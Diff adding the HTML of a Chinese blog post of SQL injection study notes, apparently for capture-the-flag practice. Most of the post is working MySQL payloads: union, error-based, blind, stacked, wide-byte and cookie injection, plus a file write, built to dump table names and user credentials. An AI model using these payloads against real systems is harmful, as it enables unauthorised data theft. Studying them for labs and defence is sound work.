@@ -1,0 +1,1031 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="chiya-66">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一．定义 SQL注入（SQLInjection）:是一种将恶意SQL代码插入到应用程序输入参数中的攻击技术，攻击成功后可以获取、篡改或删除数据库数据，甚至控制服务器 比如使用单引号来破坏sql的闭合结构 根本原因：未做参数化，直接拼接用户可控输入。 预编译会预防的原因：SQL结构先编译固定，用户输入仅作为数据，不会改变语句结构。  分类以及判断方式  数字型注入： 判断方法：使用 1 and 1&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入">
+<meta property="og:url" content="https://chiya-66.github.io/2026/11/06/sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Chiya 的博客">
+<meta property="og:description" content="一．定义 SQL注入（SQLInjection）:是一种将恶意SQL代码插入到应用程序输入参数中的攻击技术，攻击成功后可以获取、篡改或删除数据库数据，甚至控制服务器 比如使用单引号来破坏sql的闭合结构 根本原因：未做参数化，直接拼接用户可控输入。 预编译会预防的原因：SQL结构先编译固定，用户输入仅作为数据，不会改变语句结构。  分类以及判断方式  数字型注入： 判断方法：使用 1 and 1&amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image1.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image2.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image3.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image4.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image5.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image6.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image7.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image8.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image9.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image10.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image11.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image12.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image12.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image13.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image14.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image15.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image16.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image17.jpeg">
+<meta property="article:published_time" content="2026-11-06T01:57:44.000Z">
+<meta property="article:modified_time" content="2026-11-07T10:54:29.367Z">
+<meta property="article:author" content="chiya-66">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://chiya-66.github.io/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image1.jpeg">
+  
+  
+  
+  <title>sql注入 - Chiya 的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"chiya-66.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Chiya 的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="sql注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-11-06 09:57" pubdate>
+          2026年11月6日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          67 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">sql注入</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><strong>一．定义</strong></p>
+<p>SQL注入（SQL<br>Injection）:是一种<strong>将恶意SQL代码插入到应用程序输入参数中</strong>的攻击技术，攻击成功后可以<strong>获取、篡改或删除数据库数据</strong>，甚至控制服务器</p>
+<p><strong>比如使用单引号来破坏sql的闭合结构</strong></p>
+<p><strong>根本原因：未做参数化，直接拼接用户可控输入。</strong></p>
+<p><strong>预编译会预防的原因：SQL<br>结构先编译固定，用户输入仅作为数据，不会改变语句结构。</strong></p>
+<ol start="2">
+<li><strong>分类以及判断方式</strong></li>
+</ol>
+<p><strong>数字型注入：</strong> 判断方法：使用 1 and 1&#x3D;1 ，1 and 1&#x3D;2 来判断。当输入：and<br>1&#x3D;1 时页面显示正常，and 1&#x3D;2 时页面显示异常</p>
+<p><strong>字符型注入：</strong> 判断方法：使用 1&#39; and &#39;1&#39;&#x3D;&#39;1 ，1&#39; and &#39;1&#39;&#x3D;&#39;2<br>来判断。当输入：1’ and ‘1’&#x3D;&#39;1 时页面显示正常；1’and’1’&#x3D;&#39;2<br>时页面显示异常</p>
+<p><img src="/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image1.jpeg" srcset="/img/loading.gif" lazyload alt="436cc9d329cee8721f6c2ac0526fe338"><br><img src="/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image2.jpeg" srcset="/img/loading.gif" lazyload alt="7d10465ffd29a5fbe274b7882ff985a0"></p>
+<ol>
+<li><strong>注入方式</strong></li>
+</ol>
+<!-- -->
+
+<ol>
+<li><p><strong>联合注入</strong></p>
+<p>注：在联合注入的过程中，记得最后加注释符，其中--<br>和#（单行注释符）都可以，其中-- 适用范围更广</p>
+<p>一．用 order by 子句确定数据表字段数。输入id&#x3D;1&#39; order by 1 --+</p>
+</li>
+</ol>
+<p>[注：]{.underline}order by N 是SQL的排序语句， N 代表按第N个字段排序</p>
+<p>以此来确定字段数的最大值，比如字段数的长度为2，则我输入2的时候正常，3的时候则报错</p>
+<p><img src="/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image3.jpeg" srcset="/img/loading.gif" lazyload alt="5b8a2eaa4b3dae3b0aeec98c2574eb53"><br>height&#x3D;”2.152083333333333in”}<img src="/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image4.jpeg" srcset="/img/loading.gif" lazyload alt="2ad588d8c3d79dd0552de819a60bb626"><br>height&#x3D;”2.1618055555555555in”}</p>
+<p>二．字段数确定后，需构造 union select 语句提取数据库信息。大致步骤为：</p>
+<ol>
+<li><p>让原查询无结果：将 id 值改为 -1 （如 id&#x3D;-1&#39; ），使原查询返回空，触发 union 查询的结果显示</p>
+</li>
+<li><p>匹配字段数拼接查询：按2个字段构造语句，如输入id&#x3D;-1&#39; union select<br>1,2<br>--+假如说执行后页面会显示1  和2  ，说明第1、2个字段是可显示位，后续将占位符替换为查询函数即可。</p>
+<p><img src="/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image5.jpeg" srcset="/img/loading.gif" lazyload alt="2d2637ca8c693d803618ff80466cf4a3"><br>height&#x3D;”2.475in”}</p>
+</li>
+<li><p>提取基础数据库信息：id&#x3D;-1&#39; union select 1,database()<br>--+，其中括号是函数的语法特征，用于标识这是一个函数调用，而非普通的字段名或变量。</p>
+<p><img src="/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image6.jpeg" srcset="/img/loading.gif" lazyload alt="e7c17811df9fa3754ed2ef9d9581c0bd"><br>height&#x3D;”2.2840277777777778in”}</p>
+</li>
+<li><p>提取 security 数据库的所有表名: ?id&#x3D;-1’ union select<br>1,group_concat(table_name) from information_schema.tables where<br>table_schema&#x3D;database()--（这里的database要换成对应的库名，如’sqli’）</p>
+</li>
+</ol>
+<p>注：information_schema.tables <br>是指MySQL的系统元数据表，存储了所有数据库中所有表的基本信息；where<br>table_schema&#x3D;database() <br>是指筛选条件：仅查询当前数据库下的表。；table_name 是系统表字段，代表”表名”； group_concat() 将所有表名拼接成一个字符串，解决分页显示问题，直接看到全部结果</p>
+<p><img src="/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image7.jpeg" srcset="/img/loading.gif" lazyload alt="be6b0a9305882b715c1b4bb4575fe014"><br>height&#x3D;”2.6083333333333334in”}</p>
+<ol start="5">
+<li>提取列名：-1 union select 1,2,group_concat(column_name) from<br>information_schema.columns where table_name&#x3D;&#39;users&#39;（一样，<br>Users要换成对应的表名）</li>
+</ol>
+<p>注：information_schema.columns 是指MySQL的系统元数据表，存储所有数据库中所有表的字段信息；where<br>table_name&#x3D;&#39;users&#39; <br>指筛选条件：仅查询 users 表的字段；column_name 是系统表字段，代表”字段名”</p>
+<p><img src="/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image8.jpeg" srcset="/img/loading.gif" lazyload alt="8f604e280c8900776e384b5f93006876"><br>height&#x3D;”2.136111111111111in”}</p>
+<ol start="6">
+<li>提取 users 表的全量账号密码（爆flag）:-1 union select 1,<br>group_concat(<strong>列名</strong>) from <strong>表名</strong></li>
+</ol>
+<blockquote>
+<p><img src="/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image9.jpeg" srcset="/img/loading.gif" lazyload alt="aa374a27c3ad3d75bd2cb5968ac97ed6"><br>height&#x3D;”2.1430555555555557in”}</p>
+</blockquote>
+<p>**注：**若为文件导出注入，则在后面加into outfile &quot;D:&#x2F;自定义文件名&quot;--+</p>
+<p>其中，into<br>outfile ：MySQL的文件导出关键字，作用是将 select 查询的结果写入指定路径的文件中；D:&#x2F; 是磁盘根目录</p>
+<ol start="2">
+<li><p><strong>报错注入</strong></p>
+<p>当数据库不显示正常查询结果，但会显示报错信息时可使用报错注入,如下</p>
+<p><img src="/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image10.jpeg" srcset="/img/loading.gif" lazyload alt="746131e496f0047830fd62d3fb48a9e6"><br>height&#x3D;”2.4159722222222224in”}</p>
+</li>
+</ol>
+<h4 id="常用函数：extractvalue，updatexml，group-by-利用数据库报错直接带出数据"><a href="#常用函数：extractvalue，updatexml，group-by-利用数据库报错直接带出数据" class="headerlink" title="常用函数：extractvalue，updatexml，group by,利用数据库报错直接带出数据"></a>常用函数：extractvalue，updatexml，group by,利用数据库报错直接带出数据</h4><p><strong>extractvalue报错注入</strong></p>
+<p>❤ 爆破数据库名</p>
+<p>1&#39; and extractvalue(1,concat(0x5c,database(),0x5c)) #</p>
+<p><img src="/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image11.jpeg" srcset="/img/loading.gif" lazyload alt="a9cc13b1eca436a5296e1c5a35cac4a6"><br>height&#x3D;”2.9791666666666665in”}</p>
+<p>❤ 爆破表格名</p>
+<p>1&#39; and extractvalue(1,concat(0x5c,(select group_concat(table_name) from<br>information_schema.tables where table_schema&#x3D;database()),0x5c) #</p>
+<p><img src="/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image12.jpeg" srcset="/img/loading.gif" lazyload alt="1091d8f6195db98da94f13f21060e8e9"><br>height&#x3D;”2.463888888888889in”}</p>
+<p>❤ 爆破字段名</p>
+<p>1&#39; and (extractvalue(1,concat(0x5c,(select group_concat(column_name)<br>from information_schema.columns where table_schema&#x3D;database() and<br>table_name&#x3D;&#39;表格名&#39;),0x5c)))#</p>
+<p><img src="/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image12.jpeg" srcset="/img/loading.gif" lazyload alt="1091d8f6195db98da94f13f21060e8e9"><br>height&#x3D;”2.4625in”}</p>
+<p>❤ 爆破字段值（flag)</p>
+<p>1&#39; and (extractvalue(1,concat(0x5c,(select<br>group_concat(username,password) from 表格名),0x5c)))#</p>
+<p><img src="/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image13.jpeg" srcset="/img/loading.gif" lazyload alt="308683bad22663d25cca541b8018b0bf"><br>height&#x3D;”2.9715277777777778in”}</p>
+<p><strong>updatexml报错注入</strong></p>
+<p>逐步拆解：1.updatexml(1,2,1)--+</p>
+<p>2.拼接函数concat(0x7e,3,0x7e)</p>
+<p>3.SQL查询关键字（select username&#x2F;password from users limit 0,1）</p>
+<p>❤ 爆破数据库名</p>
+<p>1&#39; or updatexml(1,concat(&#39;#&#39;,database()),1) or’#</p>
+<p>❤ 爆破表格名</p>
+<p>1&#39; OR UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM<br>information_schema.tables WHERE table_schema &#x3D; &#39;数据库名&#39; LIMIT<br>0,1),0x7e),1)#</p>
+<p>使用 LIMIT 0, 1 是为了防止多行结果导致错误</p>
+<p>❤ 爆破表格字段</p>
+<p>1&#39; OR UPDATEXML(1,CONCAT(&#39;#&#39;,(SELECT GROUP_CONCAT(column_name) FROM<br>information_schema.columns WHERE table_name &#x3D; &#39;表格名&#39;)),1)#</p>
+<p>❤ 获取字段值</p>
+<p>1&#39; OR UPDATEXML(1,CONCAT(&#39;#&#39;,(SELECT<br>GROUP_CONCAT(CONCAT_WS(&#39;:&#39;,id,username,password)) FROM 表格名 LIMIT<br>0,1)),1)#</p>
+<p>❤爆破对应用户的密码</p>
+<p>123&#39; and (updatexml(1,concat(0x5c,(select password from (select<br>password from users where username&#x3D;&#39;用户名&#39;) b),0x5c),1))#</p>
+<p><strong>group by报错注入</strong></p>
+<p>❤爆破数据库</p>
+<p>123&#39; and (select count(*) from information_schema.tables group by<br>concat(database(),0x5c,floor(rand(0)*2)))#</p>
+<p>❤爆破出所有数据库表格</p>
+<p>1&#39; and (select count(*) from information_schema.tables where<br>table_schema&#x3D;database() group by concat(0x7e,(select<br>group_concat(table_name) from information_schema.tables where<br>table_schema&#x3D;database()),0x7e,floor(rand(0)*2)))#</p>
+<p>❤爆破字段名</p>
+<p>1&#39; and (select count(*) from information_schema.columns where<br>table_schema&#x3D;database() group by concat(0x7e,(select<br>group_concat(column_name) from information_schema.columns where<br>table_schema&#x3D;database() and<br>table_name&#x3D;&#39;users&#39;),0x7e,floor(rand(0)*2)))#</p>
+<p>❤爆破字段值</p>
+<p>1&#39; and (select count(*) from information_schema.columns group by<br>concat(0x7e,(select group_concat(username,password) from<br>users),0x7e,floor(rand(0)*2)))#</p>
+<p>❤爆破用户密码</p>
+<p>1&#39; and (select 1 from(select count(*) from information_schema.columns<br>where table_schema&#x3D;database() group by concat(0x7e,(select password from<br>users where username&#x3D;&#39;用户名&#39;),0x7e,floor(rand(0)*2)))a)#</p>
+<ol start="3">
+<li><p><strong>盲注</strong></p>
+<p>**概念：**在SQL注入过程中，SQL语句<br>执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试（说白了就是猜测内容），这个过程成为盲注</p>
+<p>布尔盲注：根据页面真假判断数据</p>
+<p>时间盲注：无回显，用 sleep 延时判断</p>
+<p>**分类：**布尔，时间</p>
+</li>
+</ol>
+<p><strong>布尔盲注</strong></p>
+<ol>
+<li>猜解当前数据库名的长度：构建URL：1 and<br>length(database())&#x3D;所猜测的域名长度 --+</li>
+</ol>
+<blockquote>
+<p>例如security猜测的域名长度为8</p>
+</blockquote>
+<p>2，逐位猜测数据库的字符以确定数据库的名称：.… and<br>ascii(substr(database(),1,1))&#x3D;ascii编译前的数字--+</p>
+<p>逐步拆解：substr(string, start,<br>length)的参数分别指字符串，起始位置，长度</p>
+<p>1. ascii(substr（2,1,1))</p>
+<p>2.数据库database(),</p>
+<p>3．确定数据库的名称后，尝试爆破出users表名：.…and<br>ascii(substr((select username from security.users limit<br>0,1),1,1))&#x3D;115--+（即猜测的第一个字符为s）</p>
+<p>然后逐一尝试</p>
+<p><strong>时间盲注</strong></p>
+<p>注入类型：字符型GET注入，无数据回显，仅能通过时间延迟判断SQL语句执行结果。</p>
+<ol>
+<li><p>验证注入点：?id&#x3D;1&#39; and sleep(5)<br>--+ 若页面响应延迟5秒，说明存在单引号闭合的时间盲注漏洞。一般来说后端是单引号、双引号、括号+引号的闭合方式</p>
+</li>
+<li><p>猜解数据库名长度：例如?id&#x3D;1&#39; and<br>if(length(database())&#x3D;8,sleep(5),1)<br>--+延迟则证明当前数据库名长度为8</p>
+</li>
+</ol>
+<p>注：if(condition, true_value,<br>false_value)是MySQL条件函数，这是基于时间的盲注关键部分；length(database())&#x3D;8是条件判断内容，代表数据库的长度为8；sleep(5)<br>指条件为真时的执行，代表如果该条件成立，则延迟5秒；1<br>指条件为假时的执行指 如果长度≠8，即该条件不成立，返回1（正常执行）</p>
+<ol start="3">
+<li><p>逐字符猜解数据库名：示例（猜第一个字符）： ?id&#x3D;1&#39; and<br>if(ascii(substr(database(),1,1))&#x3D;115,sleep(5),1)<br>--+若延迟5秒，则说明数据库名称第1个字符为s</p>
+</li>
+<li><p>猜解表名与字段：猜解表名：猜解表名，例如?id&#x3D;1&#39; and<br>if(substr((select table_name from information_schema.tables where<br>table_schema&#x3D;database() limit 3,1),1,1)&#x3D;&#39;u&#39;,sleep(5),1)<br>--+即为猜解出第4个表名</p>
+</li>
+</ol>
+<p>猜解 username&#x2F;password 字段：通过 information_schema.columns 系统表，与布尔盲注的方式相同</p>
+<p><strong>5.堆叠注入</strong></p>
+<p>**概念：**堆叠注入，也称堆查询注入，顾名思义就是多条语句同时执行。在SQL中，分号<br>; 用来表示一条 sql 语句的结束。</p>
+<p>**原理：**很简单，<strong>mysql_multi_query()</strong> 支持多条sql语句同时执行</p>
+<p>举例： 比如现在在输入框中输入 1&#39; or 1 &#x3D; 1#<br>，发现字段被爆破出来了，说明存在 SQL注入,尝试堆叠注入</p>
+<p>查询数据库名：1&#39;;show database();#</p>
+<p>查询表格名：1&#39;;show tables;#</p>
+<p>查询表的结构（获取字段）：</p>
+<p>1&#39;; show columns from tableName;#</p>
+<p>1&#39;;desc tableName;#</p>
+<p>【注意：如果 tableName 是纯数字，则需要用反单引号（`）将其括起来】</p>
+<p><strong>6.二次注入</strong></p>
+<p><strong>二次注入概念：</strong></p>
+<p>二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL<br>查询语句中导致的注入。二次注入是 SQL<br>注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到<br>SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL<br>查询。</p>
+<p><strong>7.宽字节注入</strong></p>
+<p>宽字节注入的核心是<strong>利用多字节字符集的编码特性，将 addslashes()<br>插入的转义反斜杠&quot;吃掉&quot;</strong>，使单引号重新生效。</p>
+<p>**原理：**其核心在于addslashes()函数在用户输入转义时，会在单引号前加斜杠（\‘），但如果我们使用宽字节时，斜杠会和之前的宽字节共同被识别为一个高位字符，从而让未被转义的单引号被识别，闭合sql语句</p>
+<p><strong>相关内容</strong></p>
+<p><strong>基础payload:</strong></p>
+<p>id&#x3D;%df&#39; or 1&#x3D;1--+<br>id&#x3D;%df&#39; and 1&#x3D;2--+</p>
+<p>其他步骤如联合注入等与之前的一样，只需注意id的变化（符合宽字节形式绕过）即可.</p>
+<p><strong>7.列名控制注入</strong></p>
+<p>本质：通过控制<br>select后的列名&#x2F;投影部分，绕过过滤规则，将原本无法直接访问的<br>flag列暴露在查询结果中。</p>
+<p>这类其核心的sql逻辑语句为$sql &#x3D; &quot;select &quot; . $_POST[&#39;query&#39;] .<br>&quot;||flag from Flag&quot;;</p>
+<p><strong>基础payload:</strong>*,1</p>
+<p>提交 *,1后，拼接后的SQL语句变为：</p>
+<p>select *,1||flag from Flag</p>
+<p><strong>注：</strong></p>
+<p>*** ：**查询表中所有列</p>
+<p>**1 ：**作为常量列，和||flag拼接成合法的列表达式</p>
+<p>MySQL会把1||flag当成普通列处理，直接在查询结果中返回flag的值</p>
+<p><strong>8.cookie注入点</strong></p>
+<p>定义：普通的SQL注入是把恶意代码放在URL里（?id&#x3D;1&#39;），而Cookie注入是把恶意代码放在Cookie里。</p>
+<p>程序员只防护了URL参数，忘记了防护Cookie，并且Cookie也会被后端接收并拼接到SQL语句中，这就造成了该漏洞</p>
+<p><strong>注入过程：</strong></p>
+<p>首先查看cookie：</p>
+<p>1. 按 F12 打开开发者工具</p>
+<p>2. 点击 Application（应用程序）标签（储存中）</p>
+<p>3. 左边找到 Cookies，点击当前网址</p>
+<p>4. 就能看到所有Cookie</p>
+<p><strong>（当然也可以直接bp抓包，然后查看）</strong></p>
+<p><img src="/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image14.jpeg" srcset="/img/loading.gif" lazyload alt="16740bf97a8b8e169a4787144aedfe40"><br>height&#x3D;”1.948611111111111in”}</p>
+<p><strong>然后修改cookie：</strong></p>
+<p>主要通过hackbar来进行cookie修改（bp也可以），主要通过修改cookie值来达到攻击的效果，攻击方法可以使用报错，也可以使用联合查询，具体攻击方式依题判断</p>
+<p><img src="/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image15.jpeg" srcset="/img/loading.gif" lazyload alt="44384b154da41c8d8ad9a1092eae7152"><br>height&#x3D;”2.9458333333333333in”}</p>
+<p><strong>注：</strong></p>
